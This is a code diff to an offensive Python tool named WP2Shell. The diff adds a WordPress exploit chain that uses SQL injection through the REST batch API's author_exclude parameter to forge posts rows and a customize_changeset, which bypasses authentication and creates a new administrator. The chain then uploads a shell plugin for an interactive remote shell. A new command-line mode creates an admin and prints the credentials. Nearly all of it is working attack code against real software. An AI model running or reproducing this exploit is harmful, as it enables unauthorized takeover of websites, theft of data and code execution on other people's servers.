@@ -38,6 +38,7 @@ import sys
 import time
 import re
 import io
+import uuid
 import zipfile
 import hashlib
 import argparse
@@ -49,7 +50,7 @@ import ssl
 import threading
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from collections import Counter
-from urllib.parse import quote, urlencode, urlparse
+from urllib.parse import quote, urlencode, urlparse, urlunparse, urlunsplit
 
 import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
@@ -1046,21 +1047,339 @@ class WP2Shell:
         log("Stacked query did not work (normal for mysqli)", "!")
         return False
 
-    def _sqli_create_admin(self, username, password, email=None):
-        """Create a new administrator user via stacked INSERT SQLi.
+    # ========================================================================
+    # Phase 3b2: Changeset-forging admin creation (vulhub / sergiointel)
+    #
+    # Leverages WordPress's Customizer changeset workflow:
+    #   1. Create 3 real oEmbed cache posts (via UNION SELECT + embed shortcode)
+    #   2. Blind-extract cache post IDs, table prefix, and existing admin ID
+    #   3. UNION SELECT 7 forged wp_posts rows including a customize_changeset
+    #      whose nav_menu_item settings carry admin user_id
+    #   4. WordPress caches forged rows as WP_Post objects; changeset publish
+    #      calls wp_set_current_user(admin_id), temporarily elevating privileges
+    #   5. Two POST /wp/v2/users sub-requests in the same batch create the new
+    #      administrator — NO stacked queries, NO FILE privilege required.
+    #
+    # Key workaround for split-query UNION blockage:
+    #   per_page=-1 + orderby=none → WP_Query selects wp_posts.* (23 cols)
+    #   so UNION SELECT column count matches.  Credit: sergiointel.
+    # ========================================================================
 
-        WordPress accepts raw MD5 hashes as a legacy fallback for
-        user_pass. Uses the same nested-batch delivery as
-        _sqli_update_password. Inserts both the user record and
-        administrator capabilities meta (wp_capabilities + wp_user_level).
+    @staticmethod
+    def _sql_hex(value):
+        """Encode a string as a MySQL hexadecimal literal."""
+        if not value:
+            return "''"
+        return "0x" + value.encode().hex()
+
+    @staticmethod
+    def _post_row(pid, content, title, status, name, parent, post_type):
+        """Build one forged wp_posts row (23 columns) for UNION SELECT."""
+        ts = WP2Shell._sql_hex("2020-01-01 00:00:00")
+        return ",".join([
+            str(pid), "1", ts, ts,
+            WP2Shell._sql_hex(content), WP2Shell._sql_hex(title), "''",
+            WP2Shell._sql_hex(status), WP2Shell._sql_hex("closed"),
+            WP2Shell._sql_hex("closed"), "''",
+            WP2Shell._sql_hex(name), "''", "''", ts, ts, "''",
+            str(parent), "''", "0",
+            WP2Shell._sql_hex(post_type), "''", "0",
+        ])
+
+    def _public_post_link(self):
+        """Return the permalink of the first published post."""
+        try:
+            url = (f"{self.target}/?rest_route=/wp/v2/posts"
+                   f"&per_page=1&_fields=link")
+            r = self.s.get(url, timeout=self.timeout)
+            items = r.json()
+            if isinstance(items, list) and items and items[0].get("link"):
+                return items[0]["link"]
+            raise ValueError("no link in response")
+        except Exception:
+            raise RuntimeError(
+                "no published post found — complete WordPress "
+                "installation first (need ≥1 published post)"
+            )
+
+    def _seed_oembed_posts(self, public_post_link):
+        """Create 3 real oembed_cache posts via UNION SELECT.
+
+        Injects a forged post containing [embed] shortcodes.  WordPress
+        processes the shortcode via oEmbed, creating real cache posts.
+        Returns (token, [embed_url_0, embed_url_1, embed_url_2]).
+        """
+        log("Seeding 3 oEmbed cache posts...")
+        token = rand_string(12)
+        parsed = urlparse(public_post_link)
+        embed_urls = []
+        for idx in range(3):
+            embed_urls.append(urlunsplit((
+                parsed.scheme, parsed.netloc, parsed.path,
+                parsed.query, f"{token}{idx}",
+            )))
+
+        seed_content = "".join(
+            f'[embed width="500" height="750"]{u}[/embed]'
+            for u in embed_urls
+        )
+        seed_query = (
+            "1) AND 1=0 UNION ALL SELECT "
+            + self._post_row(
+                0, seed_content, "seed", "publish", "seed", 0, "post")
+            + " -- -"
+        )
+        inner = [
+            {"method": "GET", "path": "http://:"},
+            {"method": "GET", "path": "/wp/v2/widgets?" + urlencode({
+                "author_exclude": seed_query,
+                "per_page": -1,
+                "orderby": "none",
+                "context": "view",
+            })},
+            {"method": "GET", "path": "/wp/v2/posts"},
+        ]
+        # Need standard 3-request batch for this (not 4-request)
+        outer = [
+            self._malformed(),
+            {"method": "POST", "path": "/wp/v2/posts",
+             "body": {"requests": inner}},
+            {"method": "POST", "path": "/batch/v1"},
+        ]
+        self._batch(outer, extra_timeout=15)
+        return token, embed_urls
+
+    def _recover_table_prefix(self):
+        """Blind-extract wp_posts table name and existing admin ID."""
+        log("Extracting table prefix and admin user ID...")
+        posts_table = self._extract_string(
+            "SELECT TABLE_NAME FROM information_schema.TABLES "
+            "WHERE TABLE_SCHEMA=DATABASE() "
+            "AND TABLE_NAME LIKE '%posts' LIMIT 1",
+            label="posts_table", max_len=40,
+        )
+        if not posts_table:
+            raise RuntimeError("could not determine posts table name")
+        # Update table prefix from posts table name
+        self.tp = posts_table[:-5]  # strip 'posts' suffix
+
+        admin_id = self._extract_string(
+            f"SELECT u.ID FROM {self.tp}users u "
+            f"JOIN {self.tp}usermeta m ON m.user_id=u.ID "
+            f"WHERE m.meta_key=0x"
+            f"{(self.tp + 'capabilities').encode().hex()} "
+            "AND INSTR(m.meta_value,"
+            + self._sql_hex('s:13:"administrator";b:1;')
+            + ")>0 ORDER BY u.ID LIMIT 1",
+            label="admin_id", max_len=8,
+        )
+        if not admin_id or not admin_id.isdigit():
+            raise RuntimeError("could not locate an existing admin user")
+        log(f"Posts table: {posts_table}, admin ID: {admin_id}", "+")
+        return posts_table, int(admin_id)
+
+    def _recover_cache_post_ids(self, posts_table, embed_urls):
+        """Blind-extract the database IDs of the 3 oembed_cache posts."""
+        log("Recovering oEmbed cache post IDs...")
+        embed_size = ('a:2:{s:5:"width";s:3:"500";'
+                      's:6:"height";s:3:"750";}')
+        cache_ids = []
+        for idx, embed_url in enumerate(embed_urls):
+            cache_key = hashlib.md5(
+                (embed_url + embed_size).encode()).hexdigest()
+            pid = self._extract_string(
+                f"SELECT ID FROM {posts_table} "
+                "WHERE post_type=0x6f656d6265645f6361636865 "
+                f"AND post_name=0x{cache_key.encode().hex()} "
+                "ORDER BY ID DESC LIMIT 1",
+                label=f"cache_id[{idx}]", max_len=8,
+            )
+            if not pid or not pid.isdigit() or int(pid) < 1:
+                raise RuntimeError(
+                    f"could not recover oEmbed cache post {idx}")
+            cache_ids.append(int(pid))
+        log(f"Cache post IDs: {cache_ids}", "+")
+        return cache_ids
+
+    def _create_admin_via_changeset(
+        self, admin_id, cache_ids, embed_urls,
+        username, password, email,
+    ):
+        """Publish a forged changeset → create administrator.
+
+        UNION SELECT returns 7 forged wp_posts rows.  The changeset row
+        carries nav_menu_item settings with the existing admin's user_id.
+        WordPress processes the changeset → wp_set_current_user(admin_id)
+        → two POST /wp/v2/users sub-requests bypass auth → admin created.
+        """
+        log("Publishing forged changeset → creating administrator...")
+
+        outer_loop_id = 1_800_000_000 + random.randint(0, 99_999_999)
+        nav_item_id = outer_loop_id + 1
+        inner_loop_id = outer_loop_id + 2
+
+        # Build changeset JSON with user_id = existing admin
+        changeset_json = json.dumps({
+            f"nav_menu_item[{nav_item_id}]": {
+                "value": {
+                    "object_id": 0, "object": "",
+                    "menu_item_parent": 0, "position": 0,
+                    "type": "custom", "title": "proof",
+                    "url": "https://github.com/vulhub/vulhub",
+                    "target": "", "attr_title": "",
+                    "description": "proof", "classes": "",
+                    "xfn": "", "status": "publish",
+                    "nav_menu_term_id": 0, "_invalid": False,
+                },
+                "type": "nav_menu_item",
+                "user_id": admin_id,  # ← triggers wp_set_current_user()
+            }
+        }, separators=(",", ":"))
+
+        poisoned = [
+            # [0] trigger: embed shortcode → triggers oEmbed re-processing
+            self._post_row(
+                0,
+                f'[embed width="500" height="750"]{embed_urls[1]}[/embed]',
+                "trigger", "publish", "trigger", 0, "post"),
+            # [1] changeset: the forged customize_changeset
+            self._post_row(
+                cache_ids[0], changeset_json,
+                "changeset", "future", str(uuid.uuid4()),
+                outer_loop_id, "customize_changeset"),
+            # [2] outer: draft post parented to changeset
+            self._post_row(
+                outer_loop_id, "outer", "outer", "draft",
+                "outer", cache_ids[0], "post"),
+            # [3] cache[1]: repurposed as publish
+            self._post_row(
+                cache_ids[1], "", "cache", "publish",
+                "cache", cache_ids[0], "post"),
+            # [4] nav_menu_item: linked to cache[2]
+            self._post_row(
+                nav_item_id, "nav", "nav", "publish",
+                "nav", cache_ids[2], "nav_menu_item"),
+            # [5] request: parented to inner_loop_id
+            self._post_row(
+                cache_ids[2], "parse", "parse", "parse",
+                "parse", inner_loop_id, "request"),
+            # [6] inner: draft post parented to cache[2]
+            self._post_row(
+                inner_loop_id, "inner", "inner", "draft",
+                "inner", cache_ids[2], "post"),
+        ]
+
+        escalation_query = (
+            "1) AND 1=0 UNION ALL SELECT "
+            + " UNION ALL SELECT ".join(poisoned)
+            + " -- -"
+        )
+
+        new_admin = {
+            "username": username, "email": email,
+            "password": password, "roles": ["administrator"],
+        }
+
+        # Batch: [malformed, inject, posts, user, user]
+        # Desync: inject→posts(SQLi+changeset), posts→user1(bypass auth),
+        #         user1→user2(backup creation)
+        inner = [
+            {"method": "GET", "path": "http://:"},
+            {"method": "GET", "path": "/wp/v2/widgets?" + urlencode({
+                "author_exclude": escalation_query,
+                "per_page": -1, "orderby": "none", "context": "view",
+            })},
+            {"method": "GET", "path": "/wp/v2/posts"},
+            {"method": "POST", "path": "/wp/v2/users",
+             "body": new_admin},
+            {"method": "POST", "path": "/wp/v2/users",
+             "body": new_admin},
+        ]
+        # Standard 3-request outer batch
+        outer = [
+            self._malformed(),
+            {"method": "POST", "path": "/wp/v2/posts",
+             "body": {"requests": inner}},
+            {"method": "POST", "path": "/batch/v1"},
+        ]
+        try:
+            self._batch(outer, extra_timeout=20)
+        except Exception:
+            pass
+
+    def _verify_admin_exists(self, username):
+        """Blind-verify the new user exists with administrator role."""
+        log(f"Verifying '{username}' exists with administrator role...")
+        cond = (
+            f"EXISTS(SELECT 1 FROM {self.tp}users u "
+            f"JOIN {self.tp}usermeta m ON m.user_id=u.ID "
+            f"WHERE u.user_login=" + self._sql_hex(username)
+            + f" AND m.meta_key="
+            + self._sql_hex(self.tp + "capabilities")
+            + " AND INSTR(m.meta_value,"
+            + self._sql_hex('s:13:"administrator";b:1;')
+            + ")>0)"
+        )
+        return self._sqli_bool(cond) is True
+
+    def _changeset_create_admin(self, username, password, email=None):
+        """Full changeset-forging admin creation chain.
+
+        Creates a new administrator account without stacked queries or
+        FILE privilege.  Requires ≥1 published post on the target.
+        Returns True if the admin was created and verified.
+        """
+        if email is None:
+            email = f"{username}@{rand_string(6)}.com"
+
+        try:
+            # Step 1: Seed oEmbed cache posts
+            public_post = self._public_post_link()
+            token, embed_urls = self._seed_oembed_posts(public_post)
+
+            # Step 2: Blind-extract table info
+            posts_table, admin_id = self._recover_table_prefix()
+
+            # Step 3: Recover cache post IDs
+            cache_ids = self._recover_cache_post_ids(
+                posts_table, embed_urls)
+
+            # Step 4: Forge changeset → create admin
+            self._create_admin_via_changeset(
+                admin_id, cache_ids, embed_urls,
+                username, password, email,
+            )
+
+            # Step 5: Verify
+            if self._verify_admin_exists(username):
+                log(f"Administrator '{username}' created and verified!",
+                    "+")
+                return True
+            log("Admin creation may have succeeded but verification "
+                "failed — attempting login...", "!")
+            if self._wp_login(username, password):
+                log(f"Administrator '{username}' confirmed via login",
+                    "+")
+                return True
+            log("Admin creation could not be verified", "-")
+            return False
+        except RuntimeError as e:
+            log(f"Changeset admin creation failed: {e}", "-")
+            return False
+
+    # -- Legacy: stacked INSERT (kept for rare configurations) ---------
+
+    def _sqli_create_admin(self, username, password, email=None):
+        """Legacy stacked INSERT admin creation (needs multi_query).
+
+        Superseded by _changeset_create_admin which works on all configs.
+        Kept as fallback for rare MySQL configs with multi_query enabled.
         """
         log(f"Creating administrator '{username}' via stacked SQLi...")
         if email is None:
             email = f"{username}@{rand_string(6)}.com"
 
         md5_hash = hashlib.md5(password.encode()).hexdigest()
-
-        # WordPress serialized capabilities array for administrator
         caps = ("a:1:{s:13:\\\"administrator\\\";b:1;}")
 
         sqli_value = (
@@ -1082,21 +1401,14 @@ class WP2Shell:
 
         inner_requests = [
             {"method": "GET", "path": "http://:"},
-            {
-                "method": "GET",
-                "path": "/wp/v2/categories?" + urlencode({
-                    "author_exclude": sqli_value,
-                }),
-            },
+            {"method": "GET", "path": "/wp/v2/categories?" + urlencode(
+                {"author_exclude": sqli_value})},
             {"method": "GET", "path": "/wp/v2/posts"},
         ]
         outer_batch = [
             self._malformed(),
-            {
-                "method": "POST",
-                "path": "/wp/v2/posts",
-                "body": {"requests": inner_requests},
-            },
+            {"method": "POST", "path": "/wp/v2/posts",
+             "body": {"requests": inner_requests}},
             {"method": "POST", "path": "/batch/v1"},
         ]
         try:
@@ -1106,10 +1418,11 @@ class WP2Shell:
 
         log(f"Attempting login as '{username}'...")
         if self._wp_login(username, password):
-            log(f"Administrator '{username}' created and authenticated", "+")
+            log(f"Administrator '{username}' created and authenticated",
+                "+")
             return True
-
-        log("Stacked INSERT failed (mysqli may not support multi_query)", "!")
+        log("Stacked INSERT failed (mysqli may not support multi_query)",
+            "!")
         return False
 
     # ========================================================================
@@ -1173,9 +1486,17 @@ class WP2Shell:
                 return True
             print()
 
-        # -- Phase 3b: Create admin via stacked INSERT (needs multi_query) --
+        # -- Phase 3b: Changeset-forging admin creation (no multi_query needed) --
         if not skip_create_admin:
-            log("Phase 3b: Create admin + login + plugin upload")
+            log("Phase 3b: Changeset-forging admin creation")
+            if self._changeset_create_admin(admin_user, admin_pass):
+                print()
+                self._upload_shell_plugin(shell_key)
+                if self.shell_url:
+                    self._interactive_shell()
+                    return True
+                return False
+            log("Falling back to stacked INSERT...", "!")
             if self._sqli_create_admin(admin_user, admin_pass):
                 print()
                 self._upload_shell_plugin(shell_key)
@@ -1391,6 +1712,9 @@ def main():
     mode.add_argument("--extract", metavar="SQL",
                       help="Extract data via blind SQLi "
                            "(e.g. \"SELECT user_login FROM wp_users LIMIT 1\")")
+    mode.add_argument("--create-admin-only", action="store_true",
+                      help="Create an admin account via changeset "
+                           "forgery and verify, then exit (no RCE)")
 
     parser.add_argument("--proxy",
                         help="HTTP proxy (e.g. http://127.0.0.1:8080)")
@@ -1511,7 +1835,8 @@ def main():
 
     # -- Single-target mode --
     _has_mode = any([args.check, args.exploit, args.shell,
-                     args.cleanup, bool(args.extract)])
+                     args.cleanup, bool(args.extract),
+                     args.create_admin_only])
     if not args.target or not _has_mode:
         parser.error("specify target+mode (--check/--exploit/...) "
                      "or use -f for batch scan")
@@ -1564,6 +1889,40 @@ def main():
             log("  SQLi only: 6.8.0–6.8.5 (needs facilitating plugin)", "!")
             log("Use --skip-version-check to force exploitation attempt.", "!")
             sys.exit(2)
+
+    if args.create_admin_only:
+        print(BANNER)
+        log(f"Target:     {wp.target}")
+        log(f"Batch URL:  {wp.batch_url}")
+        admin_user = args.admin_user or "w2s_" + rand_string(6)
+        admin_pass = args.admin_pass or rand_string(24)
+        admin_email = (f"{admin_user}@wp2shell.local"
+                       if not args.admin_user else
+                       f"{admin_user}@{rand_string(6)}.com")
+        log(f"Admin user: {admin_user}")
+        log(f"Admin pass: {admin_pass}")
+        print()
+
+        vuln = wp.check()
+        if not vuln:
+            log("Target not vulnerable, aborting.", "-")
+            sys.exit(1)
+        print()
+
+        if not wp._sqli_confirm():
+            log("SQLi not confirmed, aborting.", "-")
+            sys.exit(1)
+        print()
+
+        if wp._changeset_create_admin(admin_user, admin_pass, admin_email):
+            print()
+            log("=== ADMIN CREATED ===", "+")
+            log(f"Username: {admin_user}", "+")
+            log(f"Password: {admin_pass}", "+")
+            log(f"Email:    {admin_email}", "+")
+            log("Use --shell with these credentials for full RCE.", ">")
+            sys.exit(0)
+        sys.exit(1)
 
     if args.check:
         print(BANNER)
